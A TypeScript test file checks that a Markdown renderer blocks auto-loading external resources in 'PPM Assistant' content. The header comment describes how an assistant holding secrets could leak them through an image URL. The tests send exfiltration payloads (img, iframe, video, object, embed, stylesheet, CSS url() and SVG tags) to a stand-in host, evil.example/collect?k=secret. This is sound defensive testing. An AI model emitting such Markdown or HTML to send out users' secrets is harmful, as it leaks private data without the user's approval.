/**
 * The PPM Assistant reads untrusted content and holds secrets in its context, so its own
 * Markdown must not make the browser fetch anything: `![](https://x/?k=<secret>)` would send
 * the secret to `x` with no click and no approval. In Assistant content an external image is
 * a link the user may follow, and raw HTML that loads on its own is neutralised. An ordinary
 * chat renders exactly as before.
 */
import { afterAll, describe, expect, it } from "bun:test";
import { installDom, uninstallDom, mount } from "../../helpers/react-dom";
import { isExternalResourceUrl } from "../../../src/web/components/shared/markdown-external-resources";

installDom();
const { MarkdownRenderer } = await import("../../../src/web/components/shared/markdown-renderer");
const { AssistantContentContext } = await import("../../../src/web/components/shared/markdown-context");
afterAll(uninstallDom);

const LEAK = "https://evil.example/collect?k=secret";

async function render(content: string, mode: "normal" | "assistant-project" | "assistant-context"): Promise<HTMLElement> {
  const md = mode === "assistant-project"
    ? <MarkdownRenderer content={content} projectName="__assistant__" />
    : <MarkdownRenderer content={content} projectName="ppm" />;
  const view = await mount(mode === "assistant-context"
    ? <AssistantContentContext.Provider value={true}>{md}</AssistantContentContext.Provider>
    : md);
  const root = view.container.cloneNode(true) as HTMLElement;
  await view.unmount();
  return root;
}

/** Every URL the rendered DOM would fetch on its own. */
function autoLoaded(root: HTMLElement): string[] {
  const urls: string[] = [];
  for (const el of root.querySelectorAll("*")) {
    for (const attr of ["src", "srcset", "poster", "data", "background", "href"]) {
      const value = el.getAttribute(attr);
      if (!value) continue;
      if (attr === "href" && el.tagName === "A") continue;
      urls.push(value);
    }
    const style = el.getAttribute("style");
    if (style && /url\(/i.test(style)) urls.push(style);
  }
  for (const tag of ["iframe", "video", "audio", "embed", "object", "source", "picture", "link", "script", "style"]) {
    if (root.querySelector(tag)) urls.push(`<${tag}>`);
  }
  return urls;
}

describe("an external image in Markdown", () => {
  it("is still an image in an ordinary chat", async () => {
    const root = await render(`![chart](${LEAK})`, "normal");
    expect(root.querySelector("img")?.getAttribute("src")).toBe(LEAK);
  });

  for (const mode of ["assistant-project", "assistant-context"] as const) {
    it(`becomes a link the user clicks in Assistant content (${mode})`, async () => {
      const root = await render(`See ![chart](${LEAK}) here`, mode);
      expect(root.querySelector("img")).toBeNull();
      const link = root.querySelector("a")!;
      expect(link.getAttribute("href")).toBe(LEAK);
      expect(link.textContent).toContain("chart");
      expect(autoLoaded(root)).toEqual([]);
    });
  }

  it("does not let a protocol-relative source through the local-path loader", async () => {
    const root = await render("![x](//evil.example/a.png)", "assistant-project");
    expect(root.querySelector("img")).toBeNull();
    expect(autoLoaded(root)).toEqual([]);
  });

  it("keeps a local file image an image", async () => {
    const root = await render("![shot](/home/me/shot.png)", "assistant-project");
    expect(root.querySelector("img")).not.toBeNull();
  });
});

describe("raw HTML in Assistant content", () => {
  const HTML = [
    `<img src="${LEAK}" alt="pixel">`,
    `<img src="/home/me/a.png" srcset="${LEAK} 2x">`,
    `<iframe src="${LEAK}"></iframe>`,
    `<video src="${LEAK}" poster="${LEAK}"></video>`,
    `<audio><source src="${LEAK}"></audio>`,
    `<picture><source srcset="${LEAK}"><img src="/x.png"></picture>`,
    `<object data="${LEAK}"></object>`,
    `<embed src="${LEAK}">`,
    `<link rel="stylesheet" href="${LEAK}">`,
    `<div style="background:url(${LEAK})">bg</div>`,
    `<div style="background:u\\72l(${LEAK})">escaped</div>`,
    `<svg><image href="${LEAK}"></image></svg>`,
    `<table background="${LEAK}"><tr><td>t</td></tr></table>`,
    `<input type="image" src="${LEAK}">`,
  ].join("\n\n");

  it("loads nothing from outside PPM", async () => {
    const root = await render(HTML, "assistant-project");
    expect(autoLoaded(root).filter((u) => u.includes("evil.example") || u.startsWith("<"))).toEqual([]);
  });

  it("would have loaded every one of them in an ordinary chat (the probe sees them)", async () => {
    const root = await render(HTML, "normal");
    const leaks = autoLoaded(root).filter((u) => u.includes("evil.example") || u.startsWith("<"));
    for (const tag of ["<iframe>", "<video>", "<audio>", "<object>", "<embed>", "<link>"]) expect(leaks).toContain(tag);
    expect(leaks.filter((u) => u.includes("evil.example")).length).toBeGreaterThan(5);
  });

  it("still offers what an embed pointed at, as a link", async () => {
    const root = await render(`<iframe src="${LEAK}"></iframe>`, "assistant-project");
    expect(root.querySelector("iframe")).toBeNull();
    expect([...root.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toContain(LEAK);
  });

  it("is rendered as before in an ordinary chat", async () => {
    const root = await render(`<iframe src="${LEAK}"></iframe>`, "normal");
    expect(root.querySelector("iframe")?.getAttribute("src")).toBe(LEAK);
  });

  it("keeps maths rendering, whose layout styles fetch nothing", async () => {
    const root = await render("$$x^2 + y^2$$", "assistant-project");
    expect(root.querySelector(".katex")).not.toBeNull();
  });
});

describe("isExternalResourceUrl", () => {
  it.each([
    ["https://x.example/a.png", true],
    ["HTTP://x.example", true],
    ["//x.example/a", true],
    ["/\\x.example/a", true],
    ["ht\ntps://x.example", true],
    ["  https://x.example", true],
    ["ftp://x.example/a", true],
    ["/home/me/a.png", false],
    ["C:\\Users\\me\\a.png", false],
    ["relative/a.png", false],
    ["data:image/png;base64,AAAA", false],
    ["blob:https://ppm/123", false],
    ["", false],
  ])("%s → %s", (url, expected) => {
    expect(isExternalResourceUrl(url)).toBe(expected);
  });
});
